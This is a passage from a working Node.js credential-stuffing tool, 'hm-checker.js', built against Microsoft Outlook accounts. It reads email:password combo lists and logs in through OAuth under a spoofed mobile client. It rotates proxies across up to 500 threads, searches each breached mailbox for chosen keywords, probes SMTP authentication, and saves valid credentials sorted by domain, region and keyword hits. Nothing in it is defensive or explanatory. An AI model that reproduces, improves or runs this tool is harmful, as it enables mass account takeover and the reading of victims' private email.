      ContentSources: ['Exchange'],
      Filter: { Or: [
        { Term: { DistinguishedFolderName: 'msgfolderroot' } },
        { Term: { DistinguishedFolderName: 'DeletedItems' } },
      ]},
      From: 0,
      Query: { QueryString: query },
      Size: 25,
      Sort: [
        { Field: 'Score', SortDirection: 'Desc', Count: 3 },
        { Field: 'Time', SortDirection: 'Desc' },
      ],
      EnableTopResults: true,
      TopResultsCount: 3,
    }],
    LogicalId: sid,
  };
  try {
    const r = await client.post(MS.SEARCH_URL, payload, {
      json: true,
      headers: {
        Authorization: `Bearer ${token}`,
        'X-AnchorMailbox': `CID:${cid}`,
        'User-Agent': 'Outlook-Android/2.0',
        'X-Routing-Hint': `CID:${cid}`,
        Accept: 'application/json',
      },
    });
    if (r.status !== 200) return null;
    const j = await r.json();
    const total = j && j.EntitySets && j.EntitySets[0] &&
                  j.EntitySets[0].ResultSets && j.EntitySets[0].ResultSets[0] &&
                  j.EntitySets[0].ResultSets[0].Total;
    if (!total || total <= 0) return null;
    const raw = JSON.stringify(j);
    let subject = 'N/A', date = 'N/A';
    for (const p of ['"Subject":"', '"Topic":"', '"Preview":"']) {
      const re = new RegExp(p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '([^"]+)');
      const m = raw.match(re);
      if (m && m[1]) { subject = m[1].slice(0, 100); break; }
    }
    for (const p of [
      '"DateTimeReceived":"', '"ReceivedDateTime":"', '"DateTimeSent":"',
      '"SentDateTime":"', '"DateTimeCreated":"', '"LastModifiedTime":"',
      '"Time":"', '"SortTime":"', '"LastDeliveryTime":"',
    ]) {
      const re = new RegExp(p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '([^"]+)');
      const m = raw.match(re);
      if (m && m[1]) {
        const d = m[1].match(/(\d{4}-\d{2}-\d{2})/);
        date = d ? d[1] : m[1].slice(0, 10);
        break;
      }
    }
    return { kw, count: total, subject, date };
  } catch { return null; }
}

async function searchAllKeywords(client, token, cid, keywords) {
  if (!keywords.length || !token) return {};
  const results = await Promise.all(keywords.map(k => searchKeyword(client, token, cid, k)));
  const out = {};
  for (const r of results) {
    if (!r) continue;
    out[r.kw] = [{ subject: r.subject, date: r.date, count: r.count }];
  }
  return out;
}

// ============================================================
// SECTION 12 — SMTP PROBE
// ============================================================

function smtpProbe(email, password, { timeoutMs = 15000 } = {}) {
  return new Promise((resolve) => {
    let step = 0;
    let buf = '';
    let done = false;
    const finish = (ok, msg) => {
      if (done) return;
      done = true;
      try { sock.destroy(); } catch {}
      resolve({ ok, msg });
    };
    const sock = net.connect({ host: MS.SMTP_HOST, port: MS.SMTP_PORT }, () => {});
    sock.setTimeout(timeoutMs);
    sock.once('timeout', () => finish(false, 'timeout'));
    sock.once('error', (e) => finish(false, e.code || 'error'));
    sock.on('data', (d) => {
      buf += d.toString('utf8');
      const lines = buf.split('\r\n').filter(Boolean);
      const last = lines[lines.length - 1] || '';
      if (step === 0 && last.startsWith('220')) {
        sock.write('EHLO hm-checker\r\n');
        step = 1;
      } else if (step === 1 && last.startsWith('250')) {
        sock.write('AUTH LOGIN\r\n');
        step = 2;
      } else if (step === 2 && last.startsWith('334')) {
        sock.write(Buffer.from(email).toString('base64') + '\r\n');
        step = 3;
      } else if (step === 3 && last.startsWith('334')) {
        sock.write(Buffer.from(password).toString('base64') + '\r\n');
        step = 4;
      } else if (step === 4) {
        if (last.startsWith('235')) finish(true, 'auth ok');
        else finish(false, last.slice(0, 120));
      }
    });
  });
}

// ============================================================
// SECTION 13 — FULL ACCOUNT CHECK
// ============================================================

function emptyInfo() {
  return { inbox: 0, total: 0, kw_match: 0, kw_details: {}, location: 'Unknown', token: '', cid: '' };
}

function buildResult(email, password, status, reason, info, extra = {}) {
  const domain = (email.split('@')[1] || '?').toLowerCase();
  return {
    email, password, domain, status, reason,
    via: 'oauth',
    info: { ...emptyInfo(), ...info },
    smtp_ok: false,
    ...extra,
  };
}

async function checkAccount(email, password, { proxy = null, keywords = [], smtpCheck = false } = {}) {
  email = String(email).trim().toLowerCase();
  password = String(password);

  let login;
  try {
    login = await oauthLogin(email, password, { proxy });
  } catch (e) {
    return buildResult(email, password, 'error', 'oauth exception: ' + ((e && e.message) || e));
  }
  if (login.invalid) {
    return buildResult(email, password, 'invalid', login.error || 'invalid credentials');
  }
  if (login.error) {
    return buildResult(email, password, 'error', login.error);
  }

  const { cid, token, client } = login;

  const [location, inboxCount] = await Promise.all([
    fetchLocation(client, token, cid),
    fetchInboxCount(client, token, cid, email),
  ]);

  let kwDetails = {};
  if (keywords.length && token) {
    kwDetails = await searchAllKeywords(client, token, cid, keywords);
  }

  if (!token && inboxCount === 0 && Object.keys(kwDetails).length === 0) {
    return buildResult(email, password, 'error', 'flagged by Microsoft (no mail access)');
  }

  const result = buildResult(email, password, 'valid', 'ok', {
    inbox: inboxCount,
    total: inboxCount,
    kw_match: Object.keys(kwDetails).length > 0 ? 1 : 0,
    kw_details: kwDetails,
    location,
    token: token || '',
    cid,
  });

  if (smtpCheck) {
    try {
      const r = await smtpProbe(email, password);
      result.smtp_ok = !!r.ok;
      result.smtp_reason = r.msg;
    } catch (e) { result.smtp_reason = String(e && e.message || e).slice(0, 80); }
  }
  return result;
}

// ============================================================
// SECTION 14 — COMBO LOADING
// ============================================================

async function readLines(file) {
  try {
    const txt = await fsp.readFile(file, 'utf8');
    return txt.split(/\r?\n/);
  } catch { return []; }
}

function parseComboLine(raw) {
  if (!raw) return null;
  const line = String(raw).trim();
  if (!line || line.startsWith('#')) return null;
  const colon = line.indexOf(':');
  if (colon < 0) return null;
  const email = line.slice(0, colon).trim().toLowerCase();
  const password = line.slice(colon + 1).trim();
  if (!email || !password) return null;
  if (!/^[^\s:<>()"']+@[^\s:<>()"']+\.[^\s:<>()"']{2,}$/.test(email)) return null;
  return { email, password };
}

async function loadAccounts(file) {
  const lines = await readLines(file);
  const out = [];
  const seen = new Set();
  let bad = 0;
  for (const raw of lines) {
    const rec = parseComboLine(raw);
    if (!rec) { bad++; continue; }
    const k = rec.email + '\u0000' + rec.password;
    if (seen.has(k)) continue;
    seen.add(k);
    out.push(rec);
  }
  return { accounts: out, bad, total: lines.length };
}

function parseKeywordsText(txt) {
  if (!txt) return [];
  const set = new Set();
  for (const piece of txt.split(/[\r\n,]+/)) {
    const k = piece.trim();
    if (k && !k.startsWith('#')) set.add(k);
  }
  return [...set];
}

// ============================================================
// SECTION 15 — STORAGE
// ============================================================

async function ensureResultsDir() {
  await fsp.mkdir(APP.resultsDir, { recursive: true });
  await fsp.mkdir(path.join(APP.resultsDir, 'valid'), { recursive: true });
  await fsp.mkdir(path.join(APP.resultsDir, 'invalid'), { recursive: true });
  await fsp.mkdir(path.join(APP.resultsDir, 'hits'), { recursive: true });
}

const writeLocks = new Map();
async function appendSafe(file, line) {
  const prev = writeLocks.get(file) || Promise.resolve();
  let release;
  const myTurn = new Promise(r => { release = r; });
  writeLocks.set(file, prev.then(() => myTurn));
  await prev;
  try {
    await fsp.appendFile(file, line, 'utf8');
  } finally {
    release();
  }
}

function safe(s, n = 48) {
  return String(s || '').replace(/[^\w.\-]/g, '_').slice(0, n);
}

async function saveResult(res) {
  await ensureResultsDir();
  const line = `${res.email}:${res.password}\n`;
  await appendSafe(path.join(APP.resultsDir, 'all.txt'), line);

  if (res.status === 'valid') {
    await appendSafe(path.join(APP.resultsDir, 'valid', 'valid.txt'), line);
    const domSafe = safe(res.domain || 'x');
    await appendSafe(path.join(APP.resultsDir, 'valid', `${domSafe}.txt`), line);

    const loc = (res.info && res.info.location) || 'Unknown';
    const regionSafe = loc === 'Unknown' ? 'Unknown' : safe(loc, 30);
    const regionDir = path.join(APP.resultsDir, 'valid', regionSafe);
    await fsp.mkdir(regionDir, { recursive: true });
    await appendSafe(path.join(regionDir, `${regionSafe}.txt`), line);

    const kws = (res.info && res.info.kw_details) || {};
    const total = (res.info && res.info.total) || 0;
    for (const [kw, arr] of Object.entries(kws)) {
      const kwSafe = safe(kw);
      const first = arr[0] || {};
      const hitLine =
        `${res.email}:${res.password} | Matches:${first.count || 0} | Total:${total}` +
        ` | Country:${loc} | Date:${first.date || 'N/A'} | Subject:${String(first.subject || 'N/A').slice(0, 80)}\n`;
      await appendSafe(path.join(APP.resultsDir, 'hits', `${kwSafe}.txt`), hitLine);
    }
  } else if (res.status === 'invalid') {
    await appendSafe(path.join(APP.resultsDir, 'invalid', 'invalid.txt'), line);
  }
}

// ============================================================
// SECTION 16 — CONCURRENCY POOL
// ============================================================

async function runPool(factories, concurrency, { onProgress } = {}) {
  return new Promise((resolve) => {
    const results = new Array(factories.length);
    let idx = 0;
    let running = 0;
    let completed = 0;

    const finishOne = () => {
      running--;
      completed++;
      if (onProgress) onProgress(completed, factories.length);
      if (idx >= factories.length && running === 0) return resolve(results);
      tick();
    };

    const tick = () => {
      while (running < concurrency && idx < factories.length) {
        const myIdx = idx++;
        running++;
        Promise.resolve()
          .then(() => factories[myIdx]())
          .then((r) => { results[myIdx] = r; })
          .catch((e) => { results[myIdx] = { error: (e && e.message) || String(e) }; })
          .finally(finishOne);
      }
      if (idx >= factories.length && running === 0) resolve(results);
    };
    tick();
  });
}

// ============================================================
// SECTION 17 — INTERACTIVE PROMPTS
// ============================================================

async function askUser({ defaultThreads = 15, proxyAvailable = false } = {}) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  let useProxies = null;
  let threads = null;
  try {
    const hint = proxyAvailable ? 'y/n' : 'y/n (no proxies.txt found)';
    while (useProxies === null) {
      const raw = (await rl.question(`Use proxies? ${hint} [n]: `)).trim().toLowerCase();
      if (raw === '' || raw === 'n' || raw === 'no') useProxies = false;
      else if (raw === 'y' || raw === 'yes') useProxies = true;
      else process.stdout.write('  please answer y or n\n');
    }
    while (threads === null) {
      const raw = (await rl.question(`Threads (1-500) [${defaultThreads}]: `)).trim();
      if (raw === '') { threads = defaultThreads; break; }
      const n = parseInt(raw, 10);
      if (Number.isInteger(n) && n >= 1 && n <= 500) { threads = n; break; }
      process.stdout.write('  enter a whole number between 1 and 500\n');
    }
  } finally {
    rl.close();
  }
  return { useProxies, threads };
}

// ============================================================
// SECTION 18 — CLI
// ============================================================

function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--threads' || a === '-t') out.threads = argv[++i];
    else if (a === '--accounts' || a === '-a' || a === '--combos' || a === '-c') out.accounts = argv[++i];
    else if (a === '--keywords' || a === '-k') out.keywords = argv[++i];
    else if (a === '--proxies' || a === '-p') out.proxies = argv[++i];
    else if (a === '--no-proxies') out.noProxies = true;
    else if (a === '--no-prompt' || a === '-y') out.noPrompt = true;
    else if (a === '--smtp') out.smtp = true;
    else if (a === '--help' || a === '-h') out.help = true;
  }
  return out;
}

function printHelp() {
  console.log(`
hm-checker.js — single-file Microsoft / Outlook checker

Usage:
  node hm-checker.js                     # interactive prompts
  node hm-checker.js --no-prompt …       # scripted / CI friendly

Interactive prompts (skipped with --no-prompt):
  Q1  Use proxies? (y/n)
        y -> loads ./proxies.txt (must exist)
        n -> direct connection, proxies ignored
  Q2  Threads (1-500)   [default 15]

Options:
  -t, --threads N        Concurrency (skips thread prompt)
  -a, --accounts FILE    Accounts file (default ./accounts.txt)
  -k, --keywords FILE    Keywords file (default ./keywords.txt)
  -p, --proxies FILE     Proxy file    (default ./proxies.txt)
      --no-proxies       Force proxyless (skips proxy prompt)
      --no-prompt, -y    Skip all prompts, use flags + defaults
      --smtp             Also probe SMTP auth for valid accounts
  -h, --help             Show this help

Proxy debug:
  HM_DEBUG_PROXY=1 node hm-checker.js --no-prompt --threads 1

Input formats:
  accounts.txt           email:password (one per line)
  keywords.txt           one keyword per line, or comma-separated
                         (auto-loaded silently if present)
  proxies.txt            host:port
                         host:port:user:pass
                         user:pass@host:port
                         http://…   https://…
                         socks5://… socks4://…

Results (./results/):
  all.txt
  valid/valid.txt    valid/<domain>.txt    valid/<region>/<region>.txt
  invalid/invalid.txt
  hits/<keyword>.txt
`);
}

// ============================================================
// SECTION 19 — MAIN
// ============================================================

async function main() {
  const args = parseArgs(process.argv.slice(2));
  if (args.help) { printHelp(); return; }

  console.log(`${C.brightCyan}hm-checker${C.reset} ${C.gray}v${APP.version}${C.reset}`);
  console.log(`${C.gray}clean port  ·  no license server  ·  no telemetry  ·  no C2${C.reset}`);
  if (PROXY_DEBUG) console.log(`${C.yellow}proxy debug ON${C.reset}`);
  console.log('');

  const accountsPath = args.accounts || APP.accountsFile;
  const keywordsPath = args.keywords || APP.keywordsFile;
  const proxiesPath  = args.proxies  || APP.proxiesFile;

  if (!fs.existsSync(accountsPath)) {
    out(C.red, 'ERR', `accounts file not found: ${accountsPath}`);
    out(C.gray, '   ', `usage: node ${path.basename(__filename)} [--accounts FILE]`);
    process.exit(1);
  }
  const proxyFileExists = fs.existsSync(proxiesPath);

  let threads = null;
  if (args.threads != null) {
    const n = parseInt(args.threads, 10);
    if (Number.isInteger(n) && n >= 1 && n <= 500) threads = n;
    else {
      out(C.red, 'ERR', `--threads must be a whole number between 1 and 500`);
      process.exit(1);
    }
  }

  let useProxies = null;
  if (args.noProxies) useProxies = false;
  else if (args.proxies) useProxies = true;

  const interactive = process.stdin.isTTY && !args.noPrompt;
  if (interactive && (useProxies === null || threads === null)) {
    console.log(`${C.brightCyan}Setup${C.reset}`);
    const ans = await askUser({
      defaultThreads: threads || 15,
      proxyAvailable: proxyFileExists,
    });
    if (useProxies === null) useProxies = ans.useProxies;
    if (threads === null) threads = ans.threads;
    console.log('');
  }

  if (useProxies === null) useProxies = proxyFileExists && !args.noProxies;
  if (threads === null) threads = 15;

  // ---------- Load accounts ----------
  const { accounts, bad, total } = await loadAccounts(accountsPath);
  out(C.green, 'OK', `loaded ${accounts.length} accounts (${bad} bad / ${total} lines) from ${path.basename(accountsPath)}`);
  if (!accounts.length) {
    out(C.red, 'ERR', 'no valid accounts to check — exiting');
    process.exit(1);
  }

  // ---------- Load keywords (silent skip if missing) ----------
  let keywords = [];
  if (fs.existsSync(keywordsPath)) {
    const txt = await fsp.readFile(keywordsPath, 'utf8');
    keywords = parseKeywordsText(txt);
    if (keywords.length) {
      out(C.green, 'OK', `loaded ${keywords.length} keywords from ${path.basename(keywordsPath)}`);
    } else {
      out(C.gray, '   ', `${path.basename(keywordsPath)} present but empty`);
    }
  } else {
    out(C.gray, '   ', `no ${path.basename(keywordsPath)} — skipping keyword search`);
  }

  // ---------- Proxies ----------
  const pool = new ProxyPool();
  if (useProxies) {
    if (!proxyFileExists) {
      out(C.yellow, 'WRN', `proxies requested but ${proxiesPath} not found — falling back to direct`);
    } else {
      const lines = await readLines(proxiesPath);
      const n = pool.load(lines);
      if (n === 0) {
        out(C.yellow, 'WRN', `no valid proxies parsed from ${path.basename(proxiesPath)} — falling back to direct`);
      } else {
        out(C.green, 'OK', `loaded ${n} proxies from ${path.basename(proxiesPath)}`);
        if (PROXY_DEBUG) {
          const schemes = {};
          for (const p of pool.list) schemes[p.scheme] = (schemes[p.scheme] || 0) + 1;
          console.error(`${C.gray}    scheme breakdown: ${JSON.stringify(schemes)}${C.reset}`);
        }
      }
    }
  } else {
    out(C.gray, '   ', 'proxyless mode — direct connection');
  }

  const usingProxies = pool.size() > 0;

  out(
    C.cyan, 'RUN',
    `concurrency=${threads}  proxies=${usingProxies ? pool.size() : 'off'}  ` +
    `keywords=${keywords.length}  smtp=${args.smtp ? 'on' : 'off'}`
  );

  await ensureResultsDir();

  const stats = { valid: 0, invalid: 0, error: 0, hits: 0, checked: 0, total: accounts.length };
  const startedAt = Date.now();

  const factories = accounts.map(({ email, password }) => async () => {
    const proxy = usingProxies ? pool.next() : null;
    let res;
    try {
      res = await checkAccount(email, password, { proxy, keywords, smtpCheck: !!args.smtp });
    } catch (e) {
      res = buildResult(email, password, 'error', 'check exception: ' + ((e && e.message) || e));
    }

    const netFlavor = /timeout|network|proxy|refused|reset|socks|tls|socket|closed|CONNECT|PROXY_AUTH/i;
    if (res.status === 'error' && netFlavor.test(res.reason || '') && usingProxies && pool.size() > 1) {
      if (proxy) pool.markFail(proxy.url);
      const proxy2 = pool.next();
      if (proxy2 && (!proxy || proxy2.url !== proxy.url)) {
        try { res = await checkAccount(email, password, { proxy: proxy2, keywords, smtpCheck: !!args.smtp }); }
        catch {}
      }
    } else if (res.status === 'valid' && proxy) {
      pool.markOk(proxy.url);
    }

    try { await saveResult(res); } catch (e) { log.warn('save failed', e && e.message); }

    stats.checked++;
    if (res.status === 'valid') {
      stats.valid++;
      const kws = Object.keys((res.info && res.info.kw_details) || {});
      if (kws.length) stats.hits++;
      const loc = (res.info && res.info.location) || '?';
      const inbox = (res.info && res.info.inbox) || 0;
      const hit = kws.length ? ` ${C.brightMagenta}\uD83C\uDFAF ${kws.length} kw${C.reset}` : '';
      const smtp = res.smtp_ok ? ` ${C.brightBlue}SMTP${C.reset}` : '';
      out(C.green, '  V', `${email} ${C.gray}${loc} | ${inbox}msg${C.reset}${hit}${smtp}`);
    } else if (res.status === 'invalid') {
      stats.invalid++;
      out(C.red, '  X', email);
    } else {
      stats.error++;
      out(C.yellow, '  !', `${email} ${C.gray}${res.reason}${C.reset}`);
    }
    return res;
  });

  await runPool(factories, threads, {
    onProgress(completed, total) {
      const dt = (Date.now() - startedAt) / 1000;
      const cpm = dt > 0 ? (completed * 60 / dt).toFixed(1) : '0.0';
      process.stderr.write(
        `\r${C.gray}[${completed}/${total}] ${cpm} cpm — ` +
        `V:${stats.valid} X:${stats.invalid} !:${stats.error} hits:${stats.hits}${C.reset}    `
      );
    },
  });
  process.stderr.write('\n');

  const secs = ((Date.now() - startedAt) / 1000).toFixed(1);
  out(
    C.brightGreen, 'DONE',
    `checked ${stats.checked}/${stats.total} in ${secs}s  —  ` +
    `V:${stats.valid} X:${stats.invalid} !:${stats.error} hits:${stats.hits}`
  );
  out(C.gray, '    ', `results written to ${APP.resultsDir}`);
}

// ============================================================
// SECTION 20 — ENTRY
// ============================================================

process.on('SIGINT', () => {
  process.stderr.write('\n');
  out(C.yellow, 'SIG', 'interrupted — exiting');
  process.exit(130);
});
process.on('uncaughtException', (e) => {
  out(C.red, 'ERR', (e && e.stack) || String(e));
});
process.on('unhandledRejection', (e) => {
  out(C.red, 'REJ', (e && e.stack) || String(e));
});

if (require.main === module) {
  main().catch((e) => {
    out(C.red, 'FATAL', (e && e.stack) || String(e));
    process.exit(1);
  });
}

module.exports = {
  oauthLogin, checkAccount, checkSmtp: smtpProbe,
  searchKeyword, searchAllKeywords,
  fetchLocation, fetchInboxCount,
  CookieJar, HttpClient, ProxyPool,
  parseProxyLine, parseComboLine, loadAccounts,
};
